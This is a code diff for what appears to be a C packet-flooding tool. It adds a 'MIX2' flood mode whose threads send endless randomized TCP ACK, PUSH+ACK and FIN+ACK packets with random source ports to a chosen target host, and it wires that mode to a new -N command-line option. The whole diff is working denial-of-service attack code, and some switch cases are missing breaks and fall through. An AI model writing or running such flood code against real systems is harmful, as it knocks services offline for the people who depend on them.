@@ -18,6 +18,7 @@
 #define ACK_FLOOD  3
 #define TCP_PING   4
 #define MIX_FLOOD  5
+#define MIX2_FLOOD 6
 
 #define MAX(a,b) (a > b ? a : b)
 #define MIN(a,b) (a < b ? a : b)
@@ -344,7 +345,6 @@ void *ack_flood_attack_thread(void *param)
     return NULL;
 }
 
-
 /* MIX flood */
 void *mix_flood_attack_thread(void *param)
 {
@@ -381,6 +381,52 @@ void *mix_flood_attack_thread(void *param)
                                 TCP_PUSH | TCP_ACK,
                                 data_size, (uint8_t *)data);
             case 3: /* FIN + ACK */
+                leef_send_raw_tcp2(&leef,
+                                get_src_ip(), dest_addr,
+                                leef_random_range(1025,65535), dest_port == 0 ? leef_random_u16() : dest_port,
+                                leef_random_u16(), leef_random_u32(), leef_random_u32(),
+                                TCP_FIN | TCP_ACK,
+                                0, NULL);
+                break;
+        }
+        if(sleep_interval)
+            usleep(sleep_interval);
+    }
+
+    leef_terminate(&leef);
+    running = 0;
+    return NULL;
+}
+
+/* MIX2 flood */
+void *mix2_flood_attack_thread(void *param)
+{
+    struct leef_handle leef;
+    if(!leef_init(&leef, INJECTING))
+        return NULL;
+
+    uint32_t data[2];
+    uint8_t data_size;
+
+    while(running && (run_time == 0 || leef_get_ticks() < run_time)) {
+        switch(rand() % 3) {
+            case 0: /* ACK */
+                leef_send_tcp_ack(&leef,
+                                get_src_ip(), dest_addr,
+                                leef_random_range(1025,65535), dest_port == 0 ? leef_random_u16() : dest_port,
+                                leef_random_u16(), leef_random_u32(), leef_random_u32());
+                break;
+            case 1: /* PUSH + ACK */
+                data_size = (leef_random_byte() % 8) + 1;
+                data[0] = leef_random_u32();
+                data[1] = leef_random_u32();
+                leef_send_raw_tcp2(&leef,
+                                get_src_ip(), dest_addr,
+                                leef_random_range(1025,65535), dest_port == 0 ? leef_random_u16() : dest_port,
+                                leef_random_u16(), leef_random_u32(), leef_random_u32(),
+                                TCP_PUSH | TCP_ACK,
+                                data_size, (uint8_t *)data);
+            case 2: /* FIN + ACK */
                 leef_send_raw_tcp2(&leef,
                                 get_src_ip(), dest_addr,
                                 leef_random_range(1025,65535), dest_port == 0 ? leef_random_u16() : dest_port,
@@ -503,7 +549,8 @@ void print_help(char **argv)
     printf("  -C                - Connection flood\n");
     printf("  -S                - SYN flood\n");
     printf("  -A                - ACK flood\n");
-    printf("  -M                - MIX flood\n");
+    printf("  -M                - Mixed S/A/PA/FA flood\n");
+    printf("  -N                - Mixed A/PA/FA flood\n");
     printf("General options:\n");
     printf("  -i [interface]    - Which interface to do the action (required)\n");
     printf("  -h [host]         - Target host (required)\n");
@@ -558,6 +605,9 @@ int main(int argc, char **argv)
                     break;
                 case 'M':
                     action = MIX_FLOOD;
+                    break;
+                case 'N':
+                    action = MIX2_FLOOD;
                     break;
                 case 'i':
                     interface = argv[++arg];
@@ -728,6 +778,11 @@ int main(int argc, char **argv)
             if(!quiet) printf("MIX FLOOD %s:%d\n", hostname, dest_port);
             for(i=0; i < num_threads; ++i)
                 pthread_create(&threads[i], NULL, mix_flood_attack_thread, NULL);
+            interface_tx_thread();
+        case MIX2_FLOOD:
+            if(!quiet) printf("MIX FLOOD %s:%d\n", hostname, dest_port);
+            for(i=0; i < num_threads; ++i)
+                pthread_create(&threads[i], NULL, mix2_flood_attack_thread, NULL);
             interface_tx_thread();
             break;
     }
